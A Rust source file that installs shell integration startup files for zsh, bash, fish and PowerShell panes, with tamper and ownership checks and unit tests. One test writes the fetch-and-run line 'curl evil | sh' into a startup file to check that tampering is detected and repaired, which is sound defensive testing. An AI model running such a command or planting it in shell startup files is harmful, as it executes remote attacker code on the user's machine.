//! Hide's shell integration: how a pane Hide makes for an agent starts the
//! account's shell so the shell says when it has finished starting, after
//! the user's own startup files and anything they asked at the keyboard (a
//! `[Y/n]` update question), and Hide types an agent's command only then.
//!
//! It is VS Code's terminal shell integration: the pane runs the shell with
//! Hide's arguments (Herdr's `layout.apply` takes a pane's command), and the
//! shell reads the user's own files where and in the order it would have,
//! then reports a Herdr pane token, `hide_prompt`, which is the mark Hide
//! reads (Herdr does not parse OSC 133 prompt marks).
//!
//! - zsh reads its startup files from `ZDOTDIR`, which names files here that
//!   read the user's own with `ZDOTDIR` as the user has it and give it back,
//!   unset included, before the first prompt marks; the user's own value
//!   comes in `HIDE_SHELL_ZDOTDIR`.
//! - bash reads one file, `--init-file`, which reads the user's files in
//!   bash's own order and then marks. bash cannot read it as a login shell,
//!   so the login file reads the login shell's files itself and
//!   `shopt login_shell` stays off.
//! - fish runs its `-C` command after its configuration: the mark.
//! - Windows PowerShell runs its `-Command` after the user's profile: the
//!   prompt wrapper Herdr gives its own PowerShell panes, then the mark. It
//!   is passed inline as Herdr passes its own, because a script file would
//!   need an execution policy that allows scripts.
//!
//! A shell starts as Herdr starts its own by default (Herdr's `auto` mode):
//! a login shell on macOS and not on Linux. Other Unix shells, and an
//! integration that cannot be installed, get an explicit ordinary launch
//! with Plain readiness (`herdr-core`'s `agent_start`). On macOS the same
//! hided executable replaces itself with that shell using its login argv0;
//! Linux starts it directly. Neither route invents shell-specific flags.
//!
//! The files live under the node's account home
//! (`hide_kit::layout::shell_integration`), one folder per version of their
//! text, written once and never rewritten. A shell reads them only while it
//! starts. Another build's folder is removed once no pane has been started
//! with it for an hour.

use std::io;
use std::path::Path;
#[cfg(unix)]
use std::path::PathBuf;
#[cfg(unix)]
use std::time::{Duration, SystemTime};

pub use hide_node_link::protocol::{ShellLaunch, ShellReadiness};

/// The token the first prompt reports on the pane, and the value it reports.
pub const PROMPT_TOKEN: &str = "hide_prompt";

#[cfg(unix)]
const ZSH: [(&str, &str); 4] = [
    (".zshenv", include_str!("shell_integration/zshenv.zsh")),
    (".zprofile", include_str!("shell_integration/zprofile.zsh")),
    (".zshrc", include_str!("shell_integration/zshrc.zsh")),
    (".zlogin", include_str!("shell_integration/zlogin.zsh")),
];
/// bash's init files, by whether the shell stands for a login shell.
#[cfg(unix)]
const BASH: [(&str, &str); 2] = [
    ("login.bash", include_str!("shell_integration/login.bash")),
    (
        "interactive.bash",
        include_str!("shell_integration/interactive.bash"),
    ),
];
/// fish's `-C` command, run after its configuration.
#[cfg(unix)]
const FISH_MARK: &str = "if set -q HERDR_BIN_PATH HERDR_PANE_ID; $HERDR_BIN_PATH pane report-metadata $HERDR_PANE_ID --source hide:shell --token hide_prompt=1 >/dev/null 2>&1; end";
/// Windows PowerShell's `-Command`, run after the user's profile: Herdr
/// 0.9.3's own prompt wrapper for its PowerShell panes
/// (`WINDOWS_POWERSHELL_SHELL_INTEGRATION_COMMAND` in its `src/pane.rs`),
/// which reports the folder as OSC 9;9 at each prompt, then the mark. Like
/// Herdr's, it holds no double quote, which powershell.exe's own command
/// line parsing would corrupt.
#[cfg(windows)]
const POWERSHELL_COMMAND: &str = concat!(
    r"if ($null -eq $global:__HerdrOriginalPrompt) { $global:__HerdrOriginalPrompt = $function:prompt; function global:prompt { $out = @(& $global:__HerdrOriginalPrompt) -join ' '; $loc = $ExecutionContext.SessionState.Path.CurrentLocation; if ($loc.Provider.Name -eq 'FileSystem') { try { [Environment]::CurrentDirectory = $loc.ProviderPath } catch {}; $esc = [string][char]27; $out += $esc + ']9;9;' + $loc.ProviderPath + $esc + '\' }; $out } }",
    r"; if ($env:HERDR_BIN_PATH -and $env:HERDR_PANE_ID) { & $env:HERDR_BIN_PATH pane report-metadata $env:HERDR_PANE_ID --source hide:shell --token hide_prompt=1 *> $null }"
);
/// How long another build's folder stays after a pane was last started
/// with it. A shell reads its later startup files only once a question in
/// an earlier one is answered, which can be long after a start stopped
/// waiting for it (`herdr-core`'s `agent_start::SHELL_WAIT`, 30 s), and one
/// that finds the folder gone starts without the user's own files.
#[cfg(unix)]
const UNUSED_FOR: Duration = Duration::from_secs(60 * 60);

/// The account's shell, which a pane Hide makes runs, and the user's own
/// `ZDOTDIR`, which Hide's value replaces, `None` where unset.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct UserShell {
    pub shell: Option<String>,
    pub zdotdir: Option<String>,
}

impl UserShell {
    /// The node's own process environment, the closest it knows to the one
    /// Herdr gives a pane.
    pub fn of_process() -> Self {
        Self {
            shell: std::env::var("SHELL").ok(),
            zdotdir: std::env::var("ZDOTDIR").ok(),
        }
    }
}

/// Answers from the owning node's facts, before a terminal is created.
/// `executor` is this node's running hided, never a path from its caller.
/// A saved recipe keeps that exact path through recovery: if an update
/// removes it before creation, creation fails rather than selecting another
/// build or creating a replacement terminal.
#[cfg(unix)]
pub fn prepare(
    home: Option<&Path>,
    user: &UserShell,
    executor: Option<&Path>,
) -> io::Result<ShellLaunch> {
    let shell = user.shell.as_deref().ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::InvalidInput,
            "the account's SHELL is not set",
        )
    })?;
    require_executable(Path::new(shell))?;
    if let Some(home) = home {
        match install(home, user) {
            Ok(Some(launch)) => return Ok(launch),
            Ok(None) => {}
            Err(error) => {
                eprintln!(
                    "{}",
                    serde_json::json!({
                        "component": "shell_integration",
                        "kind": "install.failed",
                        "outcome": "plain_shell",
                        "reason": format!("{:?}", error.kind()),
                    })
                );
            }
        }
    }
    plain(shell, executor)
}

#[cfg(unix)]
fn require_executable(path: &Path) -> io::Result<()> {
    if !path.is_absolute() || !path.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "the account's shell executable must be an existing absolute file",
        ));
    }
    if !hide_platform::fs::permissions::is_executable(path)? {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "the account's shell executable cannot be run",
        ));
    }
    Ok(())
}

#[cfg(unix)]
fn plain(shell: &str, executor: Option<&Path>) -> io::Result<ShellLaunch> {
    #[cfg(target_os = "macos")]
    let command = {
        let executor = executor.ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::NotFound,
                "the owning node's hided path is unknown",
            )
        })?;
        require_executable(executor)?;
        let executor = executor.to_str().ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::InvalidInput,
                "the owning node's hided path cannot be represented",
            )
        })?;
        vec![
            executor.into(),
            "shell-exec".into(),
            "--shell".into(),
            shell.into(),
            "--login".into(),
        ]
    };
    #[cfg(not(target_os = "macos"))]
    let command = {
        let _ = executor;
        vec![shell.into()]
    };
    Ok(ShellLaunch {
        command,
        env: Default::default(),
        readiness: ShellReadiness::Plain,
    })
}

/// Windows keeps Herdr's existing PowerShell launch and prompt contract.
#[cfg(windows)]
pub fn prepare(
    home: Option<&Path>,
    user: &UserShell,
    _executor: Option<&Path>,
) -> io::Result<ShellLaunch> {
    install(home.unwrap_or_else(|| Path::new("")), user)?
        .ok_or_else(|| io::Error::other("the owning node's PowerShell recipe is missing"))
}

/// Writes the integration under `home` once and answers how a pane starts
/// `user`'s shell with it; `None` for a shell it does not reach.
#[cfg(unix)]
pub fn install(home: &Path, user: &UserShell) -> io::Result<Option<ShellLaunch>> {
    let Some(shell) = user
        .shell
        .as_deref()
        .filter(|shell| Path::new(shell).is_absolute())
    else {
        return Ok(None);
    };
    let name = Path::new(shell)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();
    // Herdr's `auto` mode.
    let login = cfg!(target_os = "macos");
    let with = |path: PathBuf| path.to_string_lossy().into_owned();
    let mut command = vec![shell.to_owned()];
    let mut env = std::collections::BTreeMap::new();
    match name {
        "zsh" => {
            if login {
                command.push("-l".into());
            }
            env.insert("ZDOTDIR".into(), with(version_folder(home)?.join("zsh")));
            if let Some(zdotdir) = &user.zdotdir {
                env.insert("HIDE_SHELL_ZDOTDIR".into(), zdotdir.clone());
            }
        }
        "bash" => {
            let file = if login { BASH[0].0 } else { BASH[1].0 };
            command.push("--init-file".into());
            command.push(with(version_folder(home)?.join("bash").join(file)));
        }
        "fish" => {
            if login {
                command.push("-l".into());
            }
            command.extend(["-C".into(), FISH_MARK.into()]);
        }
        _ => return Ok(None),
    }
    Ok(Some(ShellLaunch {
        command,
        env,
        readiness: ShellReadiness::Integrated,
    }))
}

/// Herdr's own shell for a Windows pane, Windows PowerShell, with the
/// prompt wrapper Herdr gives it and the mark.
#[cfg(windows)]
pub fn install(_home: &Path, _user: &UserShell) -> io::Result<Option<ShellLaunch>> {
    Ok(Some(ShellLaunch {
        command: vec![
            "powershell.exe".into(),
            "-NoExit".into(),
            "-Command".into(),
            POWERSHELL_COMMAND.into(),
        ],
        env: Default::default(),
        readiness: ShellReadiness::Integrated,
    }))
}

/// The folder of this build's files, written whole when it is missing.
#[cfg(unix)]
fn version_folder(home: &Path) -> io::Result<PathBuf> {
    use sha2::{Digest, Sha256};
    let files = || {
        ZSH.iter()
            .map(|(name, text)| (Path::new("zsh").join(name), *text))
            .chain(
                BASH.iter()
                    .map(|(name, text)| (Path::new("bash").join(name), *text)),
            )
    };
    let mut digest = Sha256::new();
    for (path, text) in files() {
        digest.update(path.to_string_lossy().as_bytes());
        digest.update([0]);
        digest.update(text.as_bytes());
        digest.update([0]);
    }
    let root = hide_kit::layout::shell_integration(home);
    let folder = root.join(&format!("{:x}", digest.finalize())[..16]);
    hide_platform::fs::private::create_dir_all(&root)?;
    // Every shell Hide starts runs these files, so a folder another account
    // can change holds none of them.
    if !owned_and_closed(&root)? {
        return Err(io::Error::other(format!(
            "{} can be changed by another account",
            root.display()
        )));
    }
    if folder.is_dir() {
        // A folder whose files are not exactly this build's, or that another
        // account could change, is never run: it is written again.
        if holds(&folder, files())? {
            // Started with now: another build's sweep keeps it.
            std::fs::File::open(&folder)?.set_modified(SystemTime::now())?;
            remove_unused(&root, &folder);
            return Ok(folder);
        }
        std::fs::remove_dir_all(&folder)?;
    }
    // Written beside its name and moved there in one rename, so a shell never
    // reads a folder half written; another writer that got there first wrote
    // the same text.
    let staging = tempfile::Builder::new()
        .prefix(".staging-")
        .tempdir_in(&root)?;
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(staging.path(), std::fs::Permissions::from_mode(0o700))?;
    }
    // On the disk before the rename, so a crash never leaves the folder's
    // name on files that are not whole; the account's alone whatever its
    // umask, so the check above takes them as they were written.
    let written = files().try_for_each(|(path, text)| {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        let path = staging.path().join(path);
        let parent = path
            .parent()
            .ok_or_else(|| io::Error::other("no folder for a startup file"))?;
        hide_platform::fs::private::create_dir_all(parent)?;
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .open(&path)?;
        file.write_all(text.as_bytes())?;
        file.sync_all()?;
        std::fs::File::open(parent)?.sync_all()
    });
    // A writer of the same text may have finished first.
    if let Err(error) = written {
        return if folder.is_dir() {
            Ok(folder)
        } else {
            Err(error)
        };
    }
    match hide_platform::fs::atomic::rename_no_replace_path(staging.path(), &folder) {
        Ok(()) => {
            // The folder now lives at its name; nothing is left to remove.
            let _ = staging.keep();
            std::fs::File::open(&root)?.sync_all()?;
            remove_unused(&root, &folder);
            Ok(folder)
        }
        Err(error) if error.kind() == io::ErrorKind::AlreadyExists && folder.is_dir() => Ok(folder),
        Err(error) => Err(error),
    }
}

/// Whether `path` is a real file or folder of the current account that no
/// other account can change.
#[cfg(unix)]
fn owned_and_closed(path: &Path) -> io::Result<bool> {
    use hide_platform::fs::private;
    Ok(!std::fs::symlink_metadata(path)?.file_type().is_symlink()
        && private::owned_by_current_user(path)?
        && !private::others_can_modify(path)?)
}

/// Whether `folder` holds exactly `files`, each one and the folders they sit
/// in the current account's own and closed to others.
#[cfg(unix)]
fn holds<'a>(folder: &Path, files: impl Iterator<Item = (PathBuf, &'a str)>) -> io::Result<bool> {
    if !owned_and_closed(folder)? {
        return Ok(false);
    }
    for (path, text) in files {
        let path = folder.join(path);
        let parent = path.parent().unwrap_or(folder);
        let same = owned_and_closed(parent)?
            && owned_and_closed(&path)?
            && std::fs::read(&path)? == text.as_bytes();
        if !same {
            return Ok(false);
        }
    }
    Ok(true)
}

/// Removes every other version, and what an interrupted write left, once no
/// pane has been started with it for [`UNUSED_FOR`]: the folder holds this
/// build's version and those of the builds that started panes within it.
/// Only what Hide names here is removed: a version's digest, or a staging
/// folder.
#[cfg(unix)]
fn remove_unused(root: &Path, kept: &Path) {
    let Ok(entries) = std::fs::read_dir(root) else {
        return;
    };
    let now = SystemTime::now();
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        let hides = name.starts_with(".staging-")
            || (name.len() == 16 && name.bytes().all(|byte| byte.is_ascii_hexdigit()));
        let unused = entry
            .metadata()
            .and_then(|metadata| metadata.modified())
            .is_ok_and(|modified| now.duration_since(modified).unwrap_or_default() > UNUSED_FOR);
        if hides && path != kept && unused {
            let _ = std::fs::remove_dir_all(&path);
        }
    }
}

#[cfg(all(test, unix))]
mod real_shell_tests;

#[cfg(all(test, unix))]
mod tests {
    use super::*;

    fn user(shell: &str) -> UserShell {
        UserShell {
            shell: Some(shell.into()),
            ..Default::default()
        }
    }

    fn launch(home: &Path, shell: &str) -> ShellLaunch {
        install(home, &user(shell)).unwrap().unwrap()
    }

    /// Herdr's `auto` mode: a login shell on macOS, not on Linux.
    fn login() -> bool {
        cfg!(target_os = "macos")
    }

    #[test]
    fn ordinary_sh_has_an_explicit_recipe_and_plain_readiness() {
        let executable = std::env::current_exe().unwrap();
        let prepared = prepare(None, &user("/bin/sh"), Some(&executable)).unwrap();
        let expected: Vec<String> = if login() {
            vec![
                executable.to_str().unwrap().into(),
                "shell-exec".into(),
                "--shell".into(),
                "/bin/sh".into(),
                "--login".into(),
            ]
        } else {
            vec!["/bin/sh".into()]
        };
        assert_eq!(prepared.command, expected);
        assert_eq!(prepared.readiness, ShellReadiness::Plain);
        assert!(prepared.env.is_empty());
    }

    #[test]
    fn an_integration_install_failure_preserves_the_accounts_normal_shell() {
        let root = tempfile::tempdir().unwrap();
        let home = root.path().join("not-a-folder");
        std::fs::write(&home, "occupied").unwrap();
        let executable = std::env::current_exe().unwrap();
        let prepared = prepare(Some(&home), &user("/bin/bash"), Some(&executable)).unwrap();
        assert_eq!(prepared, plain("/bin/bash", Some(&executable)).unwrap());
        assert!(
            prepared.env.is_empty(),
            "no partial integration environment escapes"
        );
        assert_eq!(std::fs::read_to_string(home).unwrap(), "occupied");
    }

    #[test]
    fn an_integrated_recipe_keeps_its_prompt_readiness() {
        let home = tempfile::tempdir().unwrap();
        let prepared = prepare(Some(home.path()), &user("/bin/bash"), None).unwrap();
        assert_eq!(prepared.readiness, ShellReadiness::Integrated);
        assert_eq!(prepared.command[0], "/bin/bash");
        assert_eq!(prepared.command[1], "--init-file");
    }

    #[test]
    fn missing_relative_or_unexecutable_account_shells_fail_before_any_install() {
        let home = tempfile::tempdir().unwrap();
        let file = home.path().join("not-executable");
        std::fs::write(&file, "not an executable").unwrap();
        for shell in [
            None,
            Some("sh"),
            Some("/hide-nonexistent-shell"),
            file.to_str(),
        ] {
            let user = UserShell {
                shell: shell.map(str::to_owned),
                ..Default::default()
            };
            assert!(prepare(Some(home.path()), &user, None).is_err());
        }
        assert!(!hide_kit::layout::shell_integration(home.path()).exists());
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_missing_or_relative_owning_node_executable_cannot_be_a_plain_recipe() {
        for executor in [
            None,
            Some(Path::new("hided")),
            Some(Path::new("/hide-removed-build/hided")),
        ] {
            assert!(prepare(None, &user("/bin/sh"), executor).is_err());
        }
    }

    #[test]
    fn zsh_starts_with_zdotdir_naming_files_that_read_the_users_own_first() {
        let home = tempfile::tempdir().unwrap();
        let zsh = launch(home.path(), "/bin/zsh");
        let expected: &[&str] = if login() {
            &["/bin/zsh", "-l"]
        } else {
            &["/bin/zsh"]
        };
        assert_eq!(zsh.command, expected);
        let folder = Path::new(&zsh.env["ZDOTDIR"]);
        for (name, _) in ZSH {
            assert!(folder.join(name).is_file(), "{name}");
        }
        assert!(folder.starts_with(hide_kit::layout::shell_integration(home.path())));
        assert_eq!(zsh.env.len(), 1, "the user had no ZDOTDIR: {:?}", zsh.env);
        // The user's own ZDOTDIR follows, and a second install answers the
        // same folder without writing it again.
        let again = install(
            home.path(),
            &UserShell {
                shell: Some("/opt/homebrew/bin/zsh".into()),
                zdotdir: Some("/home/me/.config/zsh".into()),
            },
        )
        .unwrap()
        .unwrap();
        assert_eq!(again.env["ZDOTDIR"], zsh.env["ZDOTDIR"]);
        // Taken as it was written, whatever the umask: a shell still reading
        // it keeps its files.
        let inode = |path: &Path| {
            use std::os::unix::fs::MetadataExt;
            std::fs::metadata(path).unwrap().ino()
        };
        let zshrc = Path::new(&zsh.env["ZDOTDIR"]).join(".zshrc");
        let before = inode(&zshrc);
        launch(home.path(), "/bin/zsh");
        assert_eq!(inode(&zshrc), before, "the folder was not written again");
        assert_eq!(again.env["HIDE_SHELL_ZDOTDIR"], "/home/me/.config/zsh");
        let entries = std::fs::read_dir(hide_kit::layout::shell_integration(home.path()))
            .unwrap()
            .count();
        assert_eq!(entries, 1, "no staging folder is left behind");
    }

    #[test]
    fn bash_starts_with_the_init_file_for_how_herdr_would_have_started_it() {
        let home = tempfile::tempdir().unwrap();
        let bash = launch(home.path(), "/bin/bash");
        assert_eq!(bash.command[..2], ["/bin/bash", "--init-file"]);
        let init = Path::new(&bash.command[2]);
        assert!(init.is_file());
        assert_eq!(
            init.file_name().unwrap(),
            if login() {
                "login.bash"
            } else {
                "interactive.bash"
            }
        );
        assert!(bash.env.is_empty(), "bash's environment is the user's");
    }

    #[test]
    fn fish_marks_through_its_init_command_and_needs_no_file() {
        let home = tempfile::tempdir().unwrap();
        let fish = launch(home.path(), "/usr/bin/fish");
        let mut expected = vec!["/usr/bin/fish"];
        if login() {
            expected.push("-l");
        }
        expected.extend(["-C", FISH_MARK]);
        assert_eq!(fish.command, expected);
        assert!(fish.env.is_empty());
        assert!(!hide_kit::layout::shell_integration(home.path()).exists());
    }

    #[test]
    fn a_shell_the_integration_does_not_reach_gets_no_launch() {
        let home = tempfile::tempdir().unwrap();
        for shell in [Some("/bin/sh"), Some("/usr/bin/nu"), Some("zsh"), None] {
            let user = UserShell {
                shell: shell.map(str::to_owned),
                ..Default::default()
            };
            assert_eq!(install(home.path(), &user).unwrap(), None, "{shell:?}");
        }
        assert!(!hide_kit::layout::shell_integration(home.path()).exists());
    }

    /// Every shell Hide starts runs the folder's files, so a folder that is
    /// not exactly this build's, or that another account could change, is
    /// written again before any shell is pointed at it.
    #[test]
    fn a_damaged_or_open_folder_is_written_again_before_a_shell_reads_it() {
        use std::os::unix::fs::PermissionsExt;
        type Damage = (&'static str, fn(&Path));
        let damages: [Damage; 4] = [
            ("a cut file", |folder| {
                std::fs::write(folder.join("zsh/.zshrc"), "").unwrap()
            }),
            ("a changed file", |folder| {
                std::fs::write(folder.join("bash/login.bash"), "curl evil | sh").unwrap()
            }),
            ("a folder others can write", |folder| {
                std::fs::set_permissions(folder, std::fs::Permissions::from_mode(0o777)).unwrap()
            }),
            ("a link to another folder", |folder| {
                let elsewhere = folder.with_file_name("elsewhere");
                std::fs::rename(folder, &elsewhere).unwrap();
                std::os::unix::fs::symlink(&elsewhere, folder).unwrap();
            }),
        ];
        for (damage, apply) in damages {
            let home = tempfile::tempdir().unwrap();
            let zsh = launch(home.path(), "/bin/zsh");
            let folder = Path::new(&zsh.env["ZDOTDIR"]).parent().unwrap().to_owned();
            apply(&folder);
            assert_eq!(launch(home.path(), "/bin/zsh"), zsh, "{damage}");
            assert!(
                holds(
                    &folder,
                    ZSH.iter()
                        .map(|(name, text)| (Path::new("zsh").join(name), *text))
                )
                .unwrap(),
                "{damage}"
            );
            assert!(
                !std::fs::symlink_metadata(&folder)
                    .unwrap()
                    .file_type()
                    .is_symlink(),
                "{damage}"
            );
        }
    }

    #[test]
    fn a_shell_integration_folder_others_can_change_is_never_used() {
        use std::os::unix::fs::PermissionsExt;
        let home = tempfile::tempdir().unwrap();
        let root = hide_kit::layout::shell_integration(home.path());
        std::fs::create_dir_all(&root).unwrap();
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
        assert!(install(home.path(), &user("/bin/zsh")).is_err());
    }

    #[test]
    fn another_builds_folder_goes_only_once_no_pane_started_with_it_for_an_hour() {
        let home = tempfile::tempdir().unwrap();
        let root = hide_kit::layout::shell_integration(home.path());
        let aged = |name: &str, age: Duration| {
            let path = root.join(name);
            hide_platform::fs::private::create_dir_all(&path.join("zsh")).unwrap();
            std::fs::File::open(&path)
                .unwrap()
                .set_modified(SystemTime::now() - age)
                .unwrap();
            path
        };
        let recent = aged("0123456789abcdef", UNUSED_FOR - Duration::from_secs(60));
        let unused = aged("fedcba9876543210", UNUSED_FOR + Duration::from_secs(60));
        let left = aged(".staging-left", UNUSED_FOR + Duration::from_secs(60));
        let foreign = aged("notes", UNUSED_FOR + Duration::from_secs(60));
        let zsh = launch(home.path(), "/bin/zsh");
        let ours = Path::new(&zsh.env["ZDOTDIR"]).parent().unwrap().to_owned();
        assert!(recent.is_dir(), "a pane may still be reading it");
        assert!(!unused.exists() && !left.exists());
        assert!(foreign.is_dir(), "only what Hide names there is removed");
        // This build's folder counts as used each time a pane is started
        // with it, so another build's sweep keeps it.
        std::fs::File::open(&ours)
            .unwrap()
            .set_modified(SystemTime::now() - UNUSED_FOR * 2)
            .unwrap();
        launch(home.path(), "/bin/bash");
        let age = SystemTime::now()
            .duration_since(std::fs::metadata(&ours).unwrap().modified().unwrap())
            .unwrap();
        assert!(age < UNUSED_FOR, "{age:?}");
    }
}
